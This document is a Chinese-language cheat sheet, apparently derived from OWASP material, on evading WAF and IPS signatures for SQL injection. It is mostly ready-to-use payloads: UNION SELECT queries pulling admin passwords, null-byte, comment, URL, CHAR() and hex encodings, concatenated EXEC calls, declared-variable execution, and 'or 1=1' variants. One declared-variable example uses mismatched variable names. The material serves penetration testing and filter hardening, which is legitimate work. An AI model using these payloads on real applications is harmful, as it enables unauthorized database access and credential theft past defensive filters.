
## SQL 注入签名规避技术

这些技术用于绕过 Web 应用防火墙（WAF）或入侵防御系统（IPS）等防御措施。另请参阅 
- https://github.com/OWASP/www-community

### 空白字符

删除空格或添加不会影响 SQL 语句的空格。例如：

```sql
or 'a'='a'

or 'a'  =    'a'
```

添加不会改变 SQL 语句执行的特殊字符，如换行符或制表符。例如：

```sql
or
'a'=
        'a'
```

### 空字节

在过滤器阻止的任何字符之前使用空字节（%00）。

例如，如果攻击者可能注入以下 SQL：

```sql
$input='' UNION SELECT password FROM Users WHERE username='admin'--
```

添加空字节后为：

```sql
$input='%00' UNION SELECT password FROM Users WHERE username='admin'--
```

### SQL 注释

添加 SQL 内联注释 `/**/` 作为空格的替代。以此 SQL 注入为例：

```sql
$input='' UNION SELECT password FROM Users WHERE name='admin'--
```

添加 SQL 内联注释后为：

```sql
$input=''/**/UNION/**/SELECT/**/password/**/FROM/**/Users/**/WHERE/**/name/**/LIKE/**/'admin'--
```

在MySQL中，注释甚至可以插入关键字中，这种方法可避开某些输入确认过滤，同时保留查询中的语法。
    `SEL/*foo*/ECT`

### URL 编码

使用[在线 URL 编码](https://meyerweb.com/eric/tools/dencoder/)对 SQL 语句进行编码：

```sql
$input='' UNION SELECT password FROM Users WHERE name='admin'--
```

SQL 注入语句的 URL 编码为：

`%27%20UNION%20SELECT%20password%20FROM%20Users%20WHERE%20name%3D%27admin%27--`

### 字符串函数

`Char()` 函数使用 ASCII 码来无单引号动态构建字符串。例如，`char(114,111,111,116)` 表示 `root`

```sql
$input='' UNION SELECT password FROM Users WHERE name='root'--
```

应用 `Char()` 后，SQL 注入语句为：

```sql
$input='' UNION SELECT password FROM Users WHERE name=char(114,111,111,116)--
```

### 字符串拼接

拼接可以拆分 SQL 关键字并规避过滤器。拼接语法因数据库引擎而异。以 MS SQL 引擎为例：

```sql
select 1
```

可以通过如下拼接更改简单的 SQL 语句：

```sql
EXEC('SEL' + 'ECT 1')
```

### 十六进制编码

十六进制编码技术使用十六进制编码替换原始 SQL 语句字符。例如，`root` 可以表示为 `726F6F74`

```sql
Select user from users where name = 'root'
```

使用 HEX 值的 SQL 语句为：

```sql
Select user from users where name = 726F6F74
```
- 或失效

或

```sql
Select user from users where name = unhex('726F6F74')
```
- 或失效

### 声明变量

将 SQL 注入语句声明为变量并执行。

例如，以下 SQL 注入语句：

```sql
Union Select password
```

将 SQL 语句定义为变量 `SQLivar`：

```sql
; declare @SQLivar nvarchar(80); set @myvar = N'UNI' + N'ON' + N' SELECT' + N'password');
EXEC(@SQLivar)
```

### 'or 1 = 1' 的替代表达式

```sql
OR 'SQLi' = 'SQL'+'i'
OR 'SQLi' &gt; 'S'
or 20 &gt; 1
OR 2 between 3 and 1
OR 2 < 3 and 2 > 1
OR 'SQLi' = N'SQLi'
1 and 1 = 1
1 || 1 = 1
1 && 1 = 1
```
- `N'字符串'`
    Unicode 编码格式
- `BETWEEN 起始值 AND 结束值`
    包含起始值与结束值的范围

### 避免使用被阻止的字符

如果应用程序删除或编码某些在SQL注入攻击中经常用到的字符，不使用这些字符仍然能够实施攻击。

- 如果注释符号被阻止，尝试设计注入的数据，使其不会破坏周围查询的语法。例如，将
    `' or 1=1--`
    替换为
    `' or 'a'='a`

- 在MS-SQL数据库中注入批量查询时，不必使用分号分隔符。只要纠正所有批量查询的语法，无论你是否使用分号，查询解析器都会正确解释它们。

### 避免使用简单确认

一些输入确认机制使用一个简单的黑名单，阻止或删除任何出现在这个名单中的数据。在这种情况下，应该尝试使用标准的攻击方法，寻找确认和规范化机制中的常见缺陷。例如，如果SELECT关键字被阻止或删除，可以尝试
- 大小写
- 冗余删除拼接 `SELSELECTECT`

### 利用有缺陷的过滤

输入确认机制通常包含逻辑缺陷，可对这些缺陷加以利用，使被阻止的输入避开过滤。多数情况下，这类攻击会利用应用程序在对多个确认步骤进行排序，或未能以递归方式应用净化逻辑方面的缺陷。
